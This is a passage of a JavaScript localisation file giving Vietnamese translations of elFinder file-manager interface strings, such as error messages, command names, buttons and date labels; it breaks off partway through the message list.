/**
 * Ngôn ngữ Việt Nam translation
 * @author Chung Thủy f <chungthuyf@gmail.com>
 * @author Son Nguyen <son.nguyen@catalyst.net.nz>
 * @author Nguyễn Trần Chung <admin@chungnguyen.xyz>
 * @version 2022-03-04
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.vi = {
		translator : 'Chung Thủy f &lt;chungthuyf@gmail.com&gt;, Son Nguyen &lt;son.nguyen@catalyst.net.nz&gt;, Nguyễn Trần Chung &lt;admin@chungnguyen.xyz&gt;',
		language   : 'Ngôn ngữ Việt Nam',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 04.03.2022 11:11
		fancyDateFormat : '$1 H:i', // will show like: Hôm nay 11:11
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220304-111107
		messages   : {
			'getShareText' : 'Đăng lại',
			'Editor ': 'Trình chỉnh sửa mã',

			/********************************** errors **********************************/
			'error'                : 'Lỗi',
			'errUnknown'           : 'Lỗi không xác định được.',
			'errUnknownCmd'        : 'Lỗi không rõ lệnh.',
			'errJqui'              : 'Cấu hình jQueryUI không hợp lệ. Các thành phần lựa chọn, kéo và thả phải được bao gồm.',
			'errNode'              : 'elFinder đòi hỏi phần tử DOM phải được tạo ra.',
			'errURL'               : 'Cấu hình elFinder không hợp lệ! URL không được thiết lập tùy chọn.',
			'errAccess'            : 'Truy cập bị từ chối.',
			'errConnect'           : 'Không thể kết nối với backend.',
			'errAbort'             : 'Kết nối bị hủy bỏ.',
			'errTimeout'           : 'Thời gian chờ kết nối đã hết.',
			'errNotFound'          : 'Backend không tìm thấy.',
			'errResponse'          : 'Phản hồi backend không hợp lệ.',
			'errConf'              : 'Cấu hình backend không hợp lệ.',
			'errJSON'              : 'Mô-đun PHP JSON không được cài đặt.',
			'errNoVolumes'         : 'Tập có thể đọc không có sẵn.',
			'errCmdParams'         : 'Thông số không hợp lệ cho lệnh "$1".',
			'errDataNotJSON'       : 'Dữ liệu không phải là JSON.',
			'errDataEmpty'         : 'Dữ liệu trống.',
			'errCmdReq'            : 'Backend đòi hỏi tên lệnh.',
			'errOpen'              : 'Không thể mở "$1".',
			'errNotFolder'         : 'Đối tượng không phải là một thư mục.',
			'errNotFile'           : 'Đối tượng không phải là một tập tin.',
			'errRead'              : 'Không thể đọc "$1".',
			'errWrite'             : 'Không thể ghi vào "$1".',
			'errPerm'              : 'Quyền bị từ chối.',
			'errLocked'            : '"$1" đã bị khóa và không thể đổi tên, di chuyển hoặc loại bỏ.',
			'errExists'            : 'Tập tin có tên "$1" đã tồn tại.',
			'errInvName'           : 'Tên tập tin không hợp lệ.',
			'errInvDirname'        : 'Tên thư mục không hợp lệ.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Thư mục không tìm thấy.',
			'errFileNotFound'      : 'Tập tin không tìm thấy.',
			'errTrgFolderNotFound' : 'Thư mục đích "$1" không được tìm thấy.',
			'errPopup'             : 'Trình duyệt ngăn chặn mở cửa sổ popup.',
			'errMkdir'             : 'Không thể tạo thư mục "$1".',
			'errMkfile'            : 'Không thể tạo tập tin "$1".',
			'errRename'            : 'Không thể đổi tên "$1".',
			'errCopyFrom'          : 'Sao chép tập tin từ tập "$1" không được phép.',
			'errCopyTo'            : 'Sao chép tập tin tới tập "$1" không được phép.',
			'errMkOutLink'         : 'Không thể tạo liên kết ra bên ngoài volume root.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Tải lên báo lỗi.',  // old name - errUploadCommon
			'errUploadFile'        : 'Không thể tải lên "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Không thấy tập tin nào để tải lên.',
			'errUploadTotalSize'   : 'Dữ liệu vượt quá kích thước tối đa cho phép.', // old name - errMaxSize
			'errUploadFileSize'    : 'Tập tin vượt quá kích thước tối đa cho phép.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Kiểu tập tin không được phép.',
			'errUploadTransfer'    : 'Lỗi khi truyền "$1".',
			'errUploadTemp'        : 'Không thể tạo thư mục tạm để tải lên.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Đối tượng "$1" đã tồn tại ở vị trí này và không thể thay thế bằng đối tượng với loại khác.', // new
			'errReplace'           : 'Không thể thay thế "$1".',
			'errSave'              : 'Không thể lưu "$1".',
			'errCopy'              : 'Không thể sao chép "$1".',
			'errMove'              : 'Không thể chuyển "$1".',
			'errCopyInItself'      : 'Không thể sao chép "$1" vào chính nó.',
			'errRm'                : 'Không thể xóa "$1".',
			'errTrash'             : 'Không thể cho vào thùng rác.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Không thể xóa tệp nguồn.',
			'errExtract'           : 'Không thể giải nén các tập tin từ"$1".',
			'errArchive'           : 'Không thể tạo ra lưu trữ.',
			'errArcType'           : 'Loại lưu trữ không được hỗ trợ.',
			'errNoArchive'         : 'Tập tin không phải là lưu trữ hoặc có kiểu lưu trữ không được hỗ trợ.',
			'errCmdNoSupport'      : 'Backend không hỗ trợ lệnh này.',
			'errReplByChild'       : 'Thư mục "$1" không thể được thay thế bằng một mục con mà nó chứa.',
			'errArcSymlinks'       : 'Vì lý do bảo mật, từ chối giải nén tập tin lưu trữ có chứa liên kết mềm.', // edited 24.06.2012
			'errArcMaxSize'        : 'Tập tin lưu trữ vượt quá kích thước tối đa cho phép.',
			'errResize'            : 'Không thể thay đổi kích thước "$1".',
			'errResizeDegree'      : 'Độ xoay không hợp lệ.',  // added 7.3.2013
			'errResizeRotate'      : 'Không thể xoay hình ảnh.',  // added 7.3.2013
			'errResizeSize'        : 'Kích thước hình ảnh không hợp lệ.',  // added 7.3.2013
			'errResizeNoChange'    : 'Kích thước hình ảnh không thay đổi.',  // added 7.3.2013
			'errUsupportType'      : 'Loại tập tin không được hỗ trợ.',
			'errNotUTF8Content'    : 'Tệp "$1" không phải bộ ký tự UTF-8 nên không thể chỉnh sửa.',  // added 9.11.2011
			'errNetMount'          : 'Không thể gắn kết "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Giao thức không được hỗ trợ.',     // added 17.04.2012
			'errNetMountFailed'    : 'Gắn (kết nối) thất bại.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Yêu cầu máy chủ.', // added 18.04.2012
			'errSessionExpires'    : 'Phiên của bạn đã hết hạn do không hoạt động.',
			'errCreatingTempDir'   : 'Không thể tạo thư mục tạm thời: "$1"',
			'errFtpDownloadFile'   : 'Không thể tải xuống tệp từ FTP: "$1"',
			'errFtpUploadFile'     : 'Không thể tải tệp lên FTP: "$1"',
			'errFtpMkdir'          : 'Không thể tạo thư mục từ xa trên FTP: "$1"',
			'errArchiveExec'       : 'Lỗi trong khi lưu trữ tệp: "$1"',
			'errExtractExec'       : 'Lỗi trong khi giải nén tập tin: "$1"',
			'errNetUnMount'        : 'Không thể gỡ gắn (liên kết).', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Không thể chuyển đổi thành UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Hãy thử trình duyệt mới hơn (vì trình duyệt hiện tại có vẻ cũ nên không hỗ trợ  tải lên thư mục).', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Đã hết thời gian trong khi tìm kiếm "$1". Kết quả tìm kiếm là một phần.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Cần ủy quyền lại.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Số lượng tối đa của các mục có thể chọn là $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Không thể khôi phục từ thùng rác. Không thể xác định đích khôi phục.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Không tìm thấy trình chỉnh sửa cho loại tệp này.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Lỗi xảy ra ở phía máy chủ.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Không thể làm rỗng thư mục "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Có thêm $1 lỗi.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Bạn có thể tạo tối đa $ 1 thư mục cùng một lúc.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Tạo tập tin nén',
			'cmdback'      : 'Trở lại',
			'cmdcopy'      : 'Sao chép',
			'cmdcut'       : 'Cắt',
			'cmddownload'  : 'Tải về',
			'cmdduplicate' : 'Bản sao',
			'cmdedit'      : 'Sửa tập tin',
			'cmdextract'   : 'Giải nén tập tin',
			'cmdforward'   : 'Trước',
			'cmdgetfile'   : 'Chọn tập tin',
			'cmdhelp'      : 'Giới thiệu phần mềm',
			'cmdhome'      : 'Home',
			'cmdinfo'      : 'Thông tin',
			'cmdmkdir'     : 'Thư mục',
			'cmdmkdirin'   : 'Vào thư mục mới', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Tạo tập tin Text',
			'cmdopen'      : 'Mở',
			'cmdpaste'     : 'Dán',
			'cmdquicklook' : 'Xem trước',
			'cmdreload'    : 'Nạp lại',
			'cmdrename'    : 'Đổi tên',
			'cmdrm'        : 'Xóa',
			'cmdtrash'     : 'Vào thùng rác', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Khôi phục', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Tìm tập tin',
			'cmdup'        : 'Đi tới thư mục mẹ',
			'cmdupload'    : 'Tải tập tin lên',
			'cmdview'      : 'Xem',
			'cmdresize'    : 'Thay đổi kích thước và xoay',
			'cmdsort'      : 'Sắp xếp',
			'cmdnetmount'  : 'Gắn kết khối lượng mạng', // added 18.04.2012
			'cmdnetunmount': 'Gỡ mount', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Đến địa điểm', // added 28.12.2014
			'cmdchmod'     : 'Thay đổi chế độ', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Mở một thư mục', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Đặt lại chiều rộng cột', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Toàn màn hình', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Di chuyển', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Làm rỗng thư mục', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Hủy bỏ (hoàn tác)', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Làm lại', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Sở thích', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Chọn tất cả', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Không chọn gì', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Chọn ngược lại', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Mở trong cửa sổ mới', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Ẩn (Preference)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Đóng',
			'btnSave'   : 'Lưu',
			'btnRm'     : 'Gỡ bỏ',
			'btnApply'  : 'Áp dụng',
			'btnCancel' : 'Hủy bỏ',
			'btnNo'     : 'Không',
			'btnYes'    : 'Đồng ý',
			'btnMount'  : 'Gắn kết',  // added 18.04.2012
			'btnApprove': 'Đạt được $ 1 và phê duyệt', // from v2.1 added 26.04.2012
			'btnUnmount': 'Tháo gỡ', // from v2.1 added 30.04.2012
			'btnConv'   : 'Chuyển thành', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Đây',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Âm lượng',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Tất cả',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Loại MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Tên tệp',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Lưu & Đóng', // from v2.1 added 12.6.2015
			'btnBackup' : 'Sao lưu', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Đổi tên',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Đổi tên (Tất cả)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Trước đó ($ 1 / $ 2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Tiếp theo ($ 1 / $ 2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Lưu thành', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Mở thư mục',
			'ntffile'     : 'Mở tập tin',
			'ntfreload'   : 'Nạp lại nội dung thư mục',
			'ntfmkdir'    : 'Tạo thư mục',
			'ntfmkfile'   : 'Tạo tập tin',
			'ntfrm'       : 'Xóa tập tin',
			'ntfcopy'     : 'Sao chép tập tin',
			'ntfmove'     : 'Di chuyển tập tin',
			'ntfprepare'  : 'Chuẩn bị để sao chép các tập tin',
			'ntfrename'   : 'Đổi tên tập tin',
			'ntfupload'   : 'Tải tập tin lên',
			'ntfdownload' : 'Tải tập tin',
			'ntfsave'     : 'Lưu tập tin',
			'ntfarchive'  : 'Tạo tập tin nén',
			'ntfextract'  : 'Giải nén tập tin',
			'ntfsearch'   : 'Tìm kiếm tập tin',
			'ntfresize'   : 'Thay đổi kích thước hình ảnh',
			'ntfsmth'     : 'Doing something >_<',
			'ntfloadimg'  : 'Đang tải hình ảnh',
			'ntfnetmount' : 'Gắn kết khối lượng mạng', // added 18.04.2012
			'ntfnetunmount': 'Ngắt kết nối âm lượng mạng', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Nhận kích thước hình ảnh', // added 20.05.2013
			'ntfreaddir'  : 'Đọc thông tin thư mục', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Lấy URL của liên kết', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Thay đổi chế độ tệp', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Xác minh tên tệp tải lên', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Tạo một tệp để tải xuống', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Nhận thông tin đường dẫn', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Xử lý tệp đã tải lên', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Ném vào thùng rác', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Đang khôi phục từ thùng rác', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Kiểm tra thư mục đích', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Hoàn tác hoạt động trước đó', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Làm lại hoàn tác trước đó', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Kiểm tra nội dung', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Rác', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'Chưa biết',
			'Today'       : 'Hôm nay',
			'Yesterday'   : 'Hôm qua',
			'msJan'       : 'Tháng 1',
			'msFeb'       : 'Tháng 2',
			'msMar'       : 'Tháng 3',
			'msApr'       : 'Tháng 4',
			'msMay'       : 'Tháng 5',
			'msJun'       : 'Tháng 6',
			'msJul'       : 'Tháng 7',
			'msAug'       : 'Tháng 8',
			'msSep'       : 'Tháng 9',
			'msOct'       : 'Tháng 10',
			'msNov'       : 'Tháng 11',
			'msDec'       : 'Tháng 12',
			'January'     : 'Tháng 1',
			'February'    : 'Tháng 2',
			'March'       : 'Tháng 3',
			'April'       : 'Tháng 4',
			'May'         : 'Tháng 5',
			'June'        : 'Tháng 6',
			'July'        : 'Tháng 7',
			'August'      : 'Tháng 8',
			'September'   : 'Tháng 9',
			'October'     : 'Tháng 10',
			'November'    : 'Tháng 11',
			'December'    : 'Tháng 12',
			'Sunday'      : 'Chủ nhật',
			'Monday'      : 'Thứ 2',
			'Tuesday'     : 'Thứ 3',
			'Wednesday'   : 'Thứ 4',
			'Thursday'    : 'Thứ 5',
			'Friday'      : 'Thứ 6',
			'Saturday'    : 'Thứ 7',
			'Sun'         : 'Chủ nhật',
			'Mon'         : 'Thứ 2',
			'Tue'         : 'Thứ 3',
			'Wed'         : 'Thứ 4',
			'Thu'         : 'Thứ 5',
			'Fri'         : 'Thứ 6',
			'Sat'         : 'Thứ 7',

			/******************************** sort variants ********************************/
			'sortname'          : 'theo tên',
			'sortkind'          : 'theo loại',
			'sortsize'          : 'theo kích cỡ',
			'sortdate'          : 'theo ngày',
			'sortFoldersFirst'  : 'Thư mục đầu tiên',
			'sortperm'          : 'theo quyền hạn', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'theo chế độ',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'theo người tạo',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'theo nhóm',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Ngoài ra Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'Tập tin mới.txt', // added 10.11.2015
			'untitled folder'   : 'Thư mục mới',   // added 10.11.2015
			'Archive'           : 'NewArchive',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Tập tin mới.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$ 1: Tệp',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Yêu cầu xác nhận',
			'confirmRm'       : 'Bạn có chắc chắn muốn xóa vĩnh viễn các mục?<br/>  Điều này không thể được hoàn tác!',
			'confirmRepl'     : 'Thay tập tin cũ bằng tập tin mới? (Nếu nó chứa các thư mục, nó sẽ được hợp nhất. Để sao lưu và thay thế, chọn Sao lưu.)',
			'confirmRest'     : 'Thay thế mục hiện có bằng một mục trong thùng rác?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Không có trong UTF-8 <br/> Chuyển đổi thành UTF-8? <br/> Nội dung trở thành UTF-8 bằng cách lưu sau khi chuyển đổi.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Không thể phát hiện mã hóa ký tự của tệp này. Nó cần tạm thời chuyển đổi thành UTF-8 để chỉnh sửa. <br/> Vui lòng chọn mã hóa ký tự của tệp này.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Nó đã được sửa đổi. <br/> Sẽ mất công nếu bạn không lưu các thay đổi.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Bạn có chắc chắn muốn chuyển các mục vào thùng rác?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Bạn có chắc chắn muốn chuyển các mục vào "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Áp dụng cho tất cả',
			'name'            : 'Tên',
			'size'            : 'Kích cỡ',
			'perms'           : 'Quyền',
			'modify'          : 'Sửa đổi',
			'kind'            : 'Loại',
			'read'            : 'đọc',
			'write'           : 'viết',
			'noaccess'        : 'không truy cập',
			'and'             : 'và',
			'unknown'         : 'không xác định',
			'selectall'       : 'Chọn tất cả các mục',
			'selectfiles'     : 'Chọn các mục',
			'selectffile'     : 'Chọn mục đầu tiên',
			'selectlfile'     : 'Chọn mục cuối cùng',
			'viewlist'        : 'Hiển thị danh sách',
			'viewicons'       : 'Hiển thị biểu tượng',
			'viewSmall'       : 'Biểu tượng nhỏ', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Biểu tượng vừa', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Biểu tượng lớn', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Biểu tượng cực lớn', // from v2.1.39 added 22.5.2018
			'places'          : 'Nơi',
			'calc'            : 'Tính toán',
			'path'            : 'Đường dẫn',
			'aliasfor'        : 'Bí danh cho',
			'locked'          : 'Đã khóa',
			'dim'             : 'Kích thước',
			'files'           : 'Tệp',
			'folders'         : 'Thư mục',
			'items'           : 'vật phẩm',
			'yes'             : 'Vâng',
			'no'              : 'không',
			'link'            : 'Liên kết',
			'searcresult'     : 'Kết quả tìm kiếm',
			'selected'        : 'mục đã chọn',
			'about'           : 'Về',
			'shortcuts'       : 'Lối tắt',
			'help'            : 'Giúp đỡ',
			'webfm'           : 'Trình quản lý tệp web',
			'ver'             : 'Phiên bản',
			'protocolver'     : 'phiên bản protocol',
			'homepage'        : 'Trang chủ dự án',
			'docs'            : 'Tài liệu',
			'github'          : 'Theo dõi chúng tôi trên GitHub',
			'twitter'         : 'Theo dõi chúng tôi trên Twitter',
			'facebook'        : 'Theo dõi chúng tôi trên Facebook',
			'team'            : 'Đội ngũ',
			'chiefdev'        : 'Trùm sò',
			'developer'       : 'người phát triển',
			'contributor'     : 'người đóng góp',
			'maintainer'      : 'người bảo trì',
			'translator'      : 'người dịch',
			'icons'           : 'Biểu tượng',
			'dontforget'      : 'và đừng quên lấy khăn tắm của bạn',
			'shortcutsof'     : 'Các phím tắt bị tắt',
			'dropFiles'       : 'Thả tệp vào đây',
			'or'              : 'hoặc',
			'selectForUpload' : 'Chọn tệp',
			'moveFiles'       : 'Di chuyển các mục',
			'copyFiles'       : 'Sao chép các mục',
			'restoreFiles'    : 'Khôi mục các mục', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Xóa khỏi địa điểm',
			'aspectRatio'     : 'Tỉ lệ khung hình',
			'scale'           : 'Tỉ lệ',
			'width'           : 'Rộng',
			'height'          : 'Cao',
			'resize'          : 'Thay đổi kích cỡ',
			'crop'            : 'Cắt',
			'rotate'          : 'Xoay',
			'rotate-cw'       : 'Xoay 90 độ CW',
			'rotate-ccw'      : 'Xoay 90 độ CCW',
			'degree'          : '°',
			'netMountDialogTitle' : 'Gắn kết khối lượng mạng', // added 18.04.2012
			'protocol'            : 'Giao thức', // added 18.04.2012
			'host'                : 'Chủ nhà', // added 18.04.2012
			'port'                : 'Hải cảng', // added 18.04.2012
			'user'                : 'Người sử dụng', // added 18.04.2012
			'pass'                : 'Mật khẩu', // added 18.04.2012
			'confirmUnmount'      : 'Bạn có ngắt kết nối $ 1 không?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Thả hoặc dán tệp từ trình duyệt', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Thả tệp, dán URL hoặc hình ảnh (khay nhớ tạm) vào đây', // from v2.1 added 07.04.2014
			'encoding'        : 'Mã hóa', // from v2.1 added 19.12.2014
			'locale'          : 'Địa phương',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Mục tiêu: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Tìm kiếm theo kiểu tệp (MIME)', // from v2.1 added 22.5.2015
			'owner'           : 'Chủ sở hữu', // from v2.1 added 20.6.2015
			'group'           : 'Nhóm', // from v2.1 added 20.6.2015
			'other'           : 'Khác', // from v2.1 added 20.6.2015
			'execute'         : 'Thực thi', // from v2.1 added 20.6.2015
			'perm'            : 'Quyền', // from v2.1 added 20.6.2015
			'mode'            : 'Chế độ', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Thư mục trống', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Thư mục trống\\A Kéo thả vào đây để thêm các mục', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Thư mục trống\\A Nhấn giữ để thêm các mục', // from v2.1.6 added 30.12.2015
			'quality'         : 'Chất lượng', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Tự động động bộ',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Di chuyển lên',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Lấy liên kết URL', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Các mục đã chọn ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID thư mục', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Cho phép truy cập ngoại tuyến', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Xác thực lại', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Đang tải...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Mở nhiều tập tin', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Bạn đang cố mở các tệp $ 1. Bạn có chắc chắn muốn mở trong trình duyệt không?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Kết quả tìm kiếm trống trong mục tiêu tìm kiếm.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Nó là một tập tin đang chỉnh sửa.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Bạn đã chọn $ 1 mục.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Bạn có $ 1 mục trong khay nhớ tạm.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Tìm kiếm gia tăng chỉ từ hiển thị hiện tại.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Phục hồi', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 hoàn thành', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Trình đơn ngữ cảnh', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Chuyển trang', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Khối lượng rễ', // from v2.1.16 added 16.9.2016
			'reset'           : 'Đặt lại', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Màu nền', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Chọn màu', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Lưới 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Đã bật', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Đã tắt', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Kết quả tìm kiếm trống trong chế độ xem hiện tại. \\ APress [Enter] để mở rộng mục tiêu tìm kiếm.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Kết quả tìm kiếm thư đầu tiên là trống trong chế độ xem hiện tại.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Nhãn văn bản', // from v2.1.17 added 13.10.2016
			'minsLeft'        : 'Còn $ 1 phút', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Mở lại với mã hóa đã chọn', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Lưu với mã hóa đã chọn', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Chọn thư mục', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Tìm kiếm chữ cái đầu tiên', // from v2.1.23 added 24.3.2017
			'presets'         : 'Đặt trước', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Có quá nhiều mục vì vậy không thể cho vào thùng rác.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Làm trống thư mục "$ 1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Không có mục nào trong thư mục "$ 1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Sự ưa thích', // from v2.1.26 added 28.6.2017
			'language'        : 'Ngôn ngữ', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Khởi tạo các cài đặt được lưu trong trình duyệt này', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Cài đặt thanh công cụ', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $ 1 ký tự còn lại.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $ 1 dòng còn lại.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Tổng', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Kích thước tệp thô', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Tập trung vào thành phần của hộp thoại bằng cách di chuột qua',  // from v2.1.30 added 2.11.2017
			'select'          : 'Lựa chọn', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Hành động khi chọn tệp', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Mở bằng trình chỉnh sửa được sử dụng lần trước', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Lựa chọn đối nghịch', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Bạn có chắc chắn muốn đổi tên $ 1 các mục đã chọn như $ 2 không? <br/> Không thể hoàn tác thao tác này!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Đổi tên hàng loạt', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Số', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Thêm tiền tố', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Thêm hậu tố', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Thay đổi phần mở rộng', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Cài đặt cột (Chế độ xem danh sách)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Tất cả các thay đổi sẽ phản ánh ngay lập tức vào kho lưu trữ.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Mọi thay đổi sẽ không phản ánh cho đến khi hủy gắn ổ đĩa này.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : '(Các) tập sau được gắn trên tập này cũng đã được ngắt kết nối. Bạn có chắc chắn để ngắt kết nối nó không?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Thông tin lựa chọn', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Các thuật toán để hiển thị hàm băm của tệp', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Mục thông tin (Bảng thông tin lựa chọn)', // from v2.1.38 added 28.3.2018
